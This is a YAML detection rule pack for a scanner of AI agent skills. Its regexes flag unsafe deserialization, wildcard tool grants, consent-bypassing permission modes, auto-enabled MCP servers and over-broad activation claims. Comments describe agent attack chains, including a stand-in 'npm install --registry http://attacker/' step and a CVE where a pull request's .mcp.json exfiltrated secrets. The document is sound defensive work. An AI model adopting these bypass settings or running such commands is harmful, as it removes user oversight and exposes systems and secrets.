apiVersion: skillguard.net/rulepack.v1
name: core-metadata
version: 1.1.0
description: Manifest integrity and over-privilege (rule-verification.md §4).
rules:
  - id: SG-MTA-001
    title: Unsafe YAML/deserialization tag
    ast: [AST04]
    severity: critical
    engine: static
    layer: content
    confidence: 0.95
    targets: [manifest, configs, scripts]
    match:
      # Targets are deliberately manifest/configs/scripts and NOT body/refs: this
      # is a *code* sink, and the prose that mentions it is overwhelmingly
      # security education. Measured — adding the prose targets would pull in ~35
      # occurrences of `pickle.loads()`/`yaml.load()` from Trail of Bits'
      # vulnerability-reference skills, which teach these exact sinks.
      any:
        - regex: '!!python/(object|apply|name|module)'
          confidence: 0.95
        - regex: '!ruby/object|!!java'
          confidence: 0.9
        # 0.8 per rule-verification.md §SG-MTA-001 ("yaml.load no SafeLoader
        # 0.8"); the pack had drifted to 0.7.
        - regex: '(?i)\byaml\.load\s*\('
          confidence: 0.8
        # Ruby's `Marshal.load(` is caught here too — the alternation is
        # case-insensitive, which is deliberate rather than accidental.
        - regex: '(?i)\b(pickle|marshal)\.loads?\s*\('
          confidence: 0.8
        # PyYAML's explicitly-unsafe loaders. These name their own danger, so
        # there is no ambiguity to weigh: 0.9.
        - regex: '(?i)\byaml\.(unsafe_load|full_load)\s*\('
          confidence: 0.9
        # The rest of the pickle family. `jsonpickle` was listed in the spec's
        # signals from the start and had never been implemented.
        - regex: '(?i)\b(dill|jsonpickle)\.(loads?|decode)\s*\('
          confidence: 0.8
        - regex: '(?i)\bjoblib\.load\s*\('
          confidence: 0.8
        - regex: '(?i)\b(?:np|numpy)\.load\s*\([^\n]{0,120}allow_pickle\s*=\s*True'
          confidence: 0.8
        # torch.load is pickle underneath, but since PyTorch 2.6 it defaults to
        # weights_only=True and is safe. Matching every torch.load would flag the
        # safe default and age badly, so only the explicitly re-enabled form.
        - regex: '(?i)\btorch\.load\s*\([^\n]{0,120}weights_only\s*=\s*False'
          confidence: 0.8
    suppress:
      # `\b` matters: without it this also matched `yaml.unsafe_load`, because
      # "unsafe_load" contains "safe_load". The suppress therefore silently
      # cancelled the single most dangerous call in the family — latent until the
      # leaf above was added, and it would have shipped a rule that could never
      # fire. Corpus check: bounded and unbounded forms match the same 56
      # occurrences across 14 bundles, so the boundary costs no real suppression.
      - '(?i)\bsafe_?load|SafeLoader'
    rationale: Unsafe YAML tags and pickle/marshal deserialization allow arbitrary code execution on load (AST04).
    fix: Use safe loaders (yaml.safe_load); never deserialize untrusted pickle/marshal data.

  - id: SG-MTA-003
    title: Over-broad tool grant or disabled permission gate
    ast: [AST03]
    severity: high
    engine: static
    layer: content
    confidence: 0.8
    targets: [manifest, configs]
    match:
      # `configs` is in the target list because a bundle can ship its own
      # sub-agent definition — `.claude/agents/<name>.md` — and pkg/skill.classify
      # files anything under `.claude/` as a config (skill.go:338). Verified: a
      # planted unsafe-YAML tag inside such a file already fires SG-MTA-001, so
      # the file is read and offered to every configs-targeted rule; this rule
      # simply never asked for it.
      any:
        - regex: '(?i)Bash\(\s*\*\s*\)'
          confidence: 0.85
        # `\b` binds to the `all` branch only. Applied to the whole alternation
        # it silently disabled the `*` branch: `*` is not a word character, so
        # there is no word boundary after it, and `allowed-tools: *` — the
        # canonical over-broad grant this rule is named for — did not match.
        # Verified on main: `allowed-tools: *` and `allowed-tools: ["*"]` both
        # scanned clean while `allowed-tools: all` fired. `all\b` still keeps
        # `allowlist` out.
        - regex: '(?im)^\s*allowed-tools:\s*\[?\s*[''"]?(\*|all\b)'
          confidence: 0.8
        # A sub-agent that declares `permissionMode: bypassPermissions` runs its
        # tools with **no consent prompt at all**. That is categorically worse
        # than a wide grant: `Bash(*)` is a broad permission the user still
        # approves, this is the removal of the approval. Reversec's chain ships
        # exactly this file and then has the sub-agent run
        # `npm install --registry http://attacker/`, after which the agent has no
        # visibility of what executed.
        #
        # NOT anchored with `^\s*`, unlike the allowed-tools leaf above. The
        # anchor made every one of these evadable by MINIFYING the settings
        # file: verified on main, `{\n  "permissionMode": "bypassPermissions"\n}`
        # fires while `{"permissionMode":"bypassPermissions"}` — the same
        # setting, one line — scans completely clean, because the key is
        # preceded by `{` rather than whitespace. A key/value pair is the real
        # unit here, so the key boundary is what the pattern should bind to.
        # `allowed-tools` keeps its anchor: it is YAML front-matter, where the
        # key genuinely does start a line.
        #
        # `defaultMode` is the same setting under its other name: Claude Code
        # accepts the mode at `permissions.defaultMode` in settings.json as well
        # as `permissionMode` in a sub-agent's front-matter, and the rule knew
        # only the second spelling. Bound to the dangerous VALUES, never the bare
        # key — a bare `defaultMode` is ordinary application config (the corpus
        # has one, an approval-gate UI's own TypeScript).
        - regex: '(?i)\b(?:permission_?[Mm]ode|defaultMode)\b["'']?\s*[:=]\s*["'']?(?:bypassPermissions\b|bypass\b)'
          confidence: 0.9
        # `acceptEdits` auto-approves file *writes* only — a narrower escape than
        # bypassPermissions, so it is reported at a lower confidence rather than
        # treated as equivalent. It still removes a prompt the user would
        # otherwise see for every edit.
        - regex: '(?i)\b(?:permission_?[Mm]ode|defaultMode)\b["'']?\s*[:=]\s*["'']?acceptEdits\b'
          confidence: 0.75
        # Standing consent for EVERY project-declared MCP server, with no
        # per-server prompt. This is the consent-gate half of CVE-2026-47751 /
        # GHSA-8q5r-mmjf-575q: the Claude Code Action checked out an attacker's
        # PR head, read `.mcp.json` from the working directory, and had all
        # project MCP servers unconditionally enabled — so a `.mcp.json` in a
        # pull request reached code execution on the runner and exfiltrated the
        # workflow's secrets, with no approval step anywhere in the chain. A
        # skill shipping the same key grants that on a developer's machine.
        # Both key names are 0 of 12,104 corpus files and are literal Claude
        # Code setting names, so the leaves are unambiguous.
        - regex: '(?i)\benableAllProjectMcpServers\b["'']?\s*[:=]\s*["'']?true\b'
          confidence: 0.9
        # The wildcard spelling of the same grant.
        - regex: '(?i)\benabledMcpjsonServers\b["'']?\s*[:=]\s*\[\s*["'']\*["'']'
          confidence: 0.85
    rationale: >-
      Wildcard tool grants disable least-privilege boundaries, and a bundled sub-agent that declares
      `permissionMode: bypassPermissions` goes further — it removes the consent prompt entirely, so the
      tools it was granted run unattended. A skill can carry that declaration in a second file
      (`.claude/agents/<name>.md`) while its own `SKILL.md` stays unremarkable (AST03).
    fix: >-
      Declare a scoped allowlist, e.g. Bash(git:*), Read — never Bash(*) or "*". Do not ship sub-agent
      definitions that set permissionMode to bypassPermissions or acceptEdits; leave the consent prompt
      in place and let the user grant what the skill actually needs.

  - id: SG-MTA-004
    title: Over-broad filesystem permission scope
    ast: [AST03]
    severity: medium
    engine: static
    layer: content
    confidence: 0.7
    targets: [manifest]
    match:
      # Sibling of SG-MTA-003 (which covers over-broad *tool* grants). This
      # covers a manifest that declares whole-filesystem or home-directory
      # *path* scope: a read/write/edit/paths/permissions key whose value is a
      # bare `/`, `~`, `*`, `**`, or `**/*` — the entire tree, not a subdir.
      #
      # `manifest`-only on purpose: the front-matter is where a permission is
      # *declared*. The lone corpus match of an earlier draft was `path: '/'`
      # inside a JavaScript cookie config in a fenced body block — real code, not
      # a grant — and scoping to the manifest excludes it by construction.
      any:
        # The broad token must be the WHOLE quoted value (RE2 has no
        # backreferences, so the closing quote is optional and the value is
        # anchored by end-of-line / list-close instead). This is what lets
        # `src/**/*.py` through — the glob there is a suffix, not the scope.
        - regex: '(?im)^\s*(read|write|edit|paths|permissions?|filesystem|fs|allow(?:ed)?[-_]?(?:paths?|write|read)|scope)\s*:\s*\[?\s*[''"]?(\*\*/\*|/\*\*|\*\*|~/?|/|\*)[''"]?\s*[,\]]?\s*$'
          confidence: 0.7
        # Same declaration written as a JSON/flow array of only broad globs:
        # `"write": ["/"]`, `read: ['**/*']`.
        - regex: '(?im)^\s*[''"]?(read|write|edit|paths|permissions?|filesystem|fs)[''"]?\s*:\s*\[\s*[''"](\*\*/\*|/\*\*|\*\*|~/?|/|\*)[''"]\s*\]'
          confidence: 0.75
    rationale: A manifest that grants read/write/edit access to the whole filesystem (`/`), the home directory (`~`), or an unbounded glob (`**/*`, `*`) hands the skill far more reach than any single function needs — the file-scope half of over-privilege (AST03).
    fix: 'Scope filesystem permissions to the skill''s own workspace and the specific files it needs, e.g. `read: ["./data/*.csv"]` — never `/`, `~`, or `**/*`.'

  - id: SG-TRIG-001
    title: Over-broad activation trigger
    ast: [AST04]
    severity: medium
    engine: static
    layer: content
    confidence: 0.7
    targets: [manifest, body]
    match:
      # A skill's description is its activation trigger — the agent reads it to
      # decide relevance. A description that claims the skill applies to *any/every
      # task* (rather than a scoped domain) hijacks the agent's attention onto
      # unrelated work, widening the skill's reach the way an over-broad permission
      # widens its capability (AST04 metadata over-claim). The leaves require a
      # *universal* activation object (task/request/query/prompt/interaction), not a
      # scoped one (a filetype or domain) — "for any Python task" / "all Markdown
      # files" stay clean, "for every task" / "regardless of the task" do not.
      #
      # A universal object is necessary but NOT sufficient, and assuming it was is
      # what made this rule 2% precise on 777 real skills (43 FPs / 46 hits, audit
      # in rule-verification.md). Every one of those objects is ordinary developer
      # vocabulary: `on every request` is an HTTP header, `for all queries` is SQL,
      # `no matter what` is an English idiom (it even matched the GPL text in a
      # bundled ThirdPartyLicenses.txt), `in all cases` is a discourse marker. So
      # each object leaf now also requires an **activation anchor** on the same
      # line — the subject (`this skill/tool/agent`) or a verb in activation
      # position (`triggers on`, `invoke for`, `always use`, `applies to`,
      # `relevant`). "Is a universal object present?" is the wrong question;
      # "is this line claiming that *this skill* activates?" is the right one.
      any:
        # (1) activation anchor + universal activation object, anchor first.
        # The object alternation carries all three phrasings that used to be
        # separate unanchored leaves: `for/on/to/handle all|every <task-noun>`,
        # `regardless of|no matter <the task>`, and `in all situations`.
        # Preposition set excludes "with" on purpose: "comply/respond with every
        # request" is compliance/jailbreak framing (SG-ANTI-001/SG-INJ-009 own
        # it), not an activation over-claim. `no matter what` needs an explicit
        # agent continuation (`what the user asks`) — bare `what` is the idiom.
        - regex: '(?i)(?:this\s+(?:skill|tool|agent|plugin)|always\s+(?:use|appl|invok|activat|trigger)\w*|trigger(?:s|ed|ing)?\s+(?:on|for|when|whenever)|activat(?:e|es|ed|ing|ion)\s+(?:on|for|when|whenever)|invoked?\s+(?:on|for|when|whenever)|applies\s+to|(?:relevant|applicable)\s+(?:in|to|for|on)\b)[^\n]{0,60}(?:(?:(?:for|on|to|handle)\s+)?(?:all|every|any\s+and\s+all)\s+(?:kinds?\s+of\s+|types?\s+of\s+|sorts?\s+of\s+)?(?:task|request|quer(?:y|ies)|prompt|question|interaction|situation|scenario|conversation|session|message|turn|user\s+(?:request|input|message|interaction|quer(?:y|ies)|prompt))s?\b|(?:regardless\s+of|no\s+matter|irrespective\s+of)\s+(?:the\s+)?(?:task|request|quer(?:y|ies)|context|topic|subject|what\s+(?:the\s+)?(?:user|task|request|question|prompt))s?\b|in\s+(?:all|every|any)\s+(?:case|situation|context|scenario|circumstance)s?\b)'
          confidence: 0.7
        # (2) same pair, object first — "Handle every user request with this skill."
        - regex: '(?i)(?:(?:(?:for|on|to|handle)\s+)?(?:all|every|any\s+and\s+all)\s+(?:kinds?\s+of\s+|types?\s+of\s+|sorts?\s+of\s+)?(?:task|request|quer(?:y|ies)|prompt|question|interaction|situation|scenario|conversation|session|message|turn|user\s+(?:request|input|message|interaction|quer(?:y|ies)|prompt))s?\b|(?:regardless\s+of|no\s+matter|irrespective\s+of)\s+(?:the\s+)?(?:task|request|quer(?:y|ies)|context|topic|subject|what\s+(?:the\s+)?(?:user|task|request|question|prompt))s?\b|in\s+(?:all|every|any)\s+(?:case|situation|context|scenario|circumstance)s?\b)[^\n]{0,60}(?:this\s+(?:skill|tool|agent|plugin)|always\s+(?:use|appl|invok|activat|trigger)\w*|applies\s+to|(?:relevant|applicable)\s+(?:in|to|for|on)\b)'
          confidence: 0.7
        # (3) always use/invoke this skill — self-anchoring, no object needed.
        - regex: '(?i)\balways\s+(use|apply|invoke|activate|trigger|prefer|rely on|reach for|choose)\s+(this\s+)?(skill|tool|agent|it|me)\b'
          confidence: 0.7
        # (4) this skill should (always) be used for any/every task
        - regex: '(?i)\b(this\s+)?(skill|tool)\s+(should\s+|must\s+|is\s+to\s+)?(always\s+)?(be\s+)?(use|appl|activat|invok|trigger)\w*\s+(for|on|whenever|regardless)\b[^\n]{0,25}\b(any|every|all|everything|task|request)\b'
          confidence: 0.7
        # (5) "this skill is always relevant/applicable" — the objectless claim.
        - regex: '(?i)\b(this\s+)?(skill|tool|agent)\s+is\s+always\s+(relevant|applicable|useful|needed|appropriate)\b'
          confidence: 0.7
        # (6) unconditional / everything-scoped activation.
        - regex: '(?i)\b(use|apply|invoke|activate|trigger|load|run)\s+(this\s+)?(skill|tool|agent)\s+(unconditionally\b|(for|on)\s+(everything|anything|literally\s+anything)\b)'
          confidence: 0.75
        # (7) load at the start of every conversation/session/turn — the
        # always-on hook shape (`adaptive-reasoning`'s real description is the
        # corpus's one true positive of this family).
        - regex: '(?i)\b(load|use|invoke|activate|apply|run|trigger)\s+(this\s+)?(skill|tool|agent)\s+(automatically\s+|proactively\s+)?(at\s+the\s+(start|beginning)\s+of\s+)?(on\s+|for\s+|in\s+)?(every|each|all)\s+(conversation|session|chat|turn|message|prompt|request|interaction)s?\b'
          confidence: 0.75
    suppress:
      # A trigger that is scoped by a following conditional is doing its job:
      # "Always use this skill WHEN the user asks to draw a diagram" is the
      # correct way to write an activation trigger, and it was leaf (3)'s only
      # corpus hit. The universal-object leaves are unaffected — "always use this
      # skill for every task" has no conditional and still fires.
      - '(?i)\balways\s+(use|apply|invoke|activate|trigger|prefer|rely on|reach for|choose)\s+(this\s+)?(skill|tool|agent|it|me)\s+(when|whenever|if|unless|before|after|to)\b'
    rationale: >-
      A skill whose description claims it applies to any/every task — rather than a scoped domain —
      over-claims its activation trigger, steering the agent to invoke it on unrelated work. This is
      the activation-surface analogue of over-broad permissions: it widens the skill's reach at the
      metadata layer, where the agent decides relevance (AST04).
    fix: >-
      Scope the description to what the skill actually does — the file types, domain, or task it
      handles — so the agent activates it only when relevant. Remove universal-activation phrasing
      like "for every task", "always use this skill", or "regardless of the request".
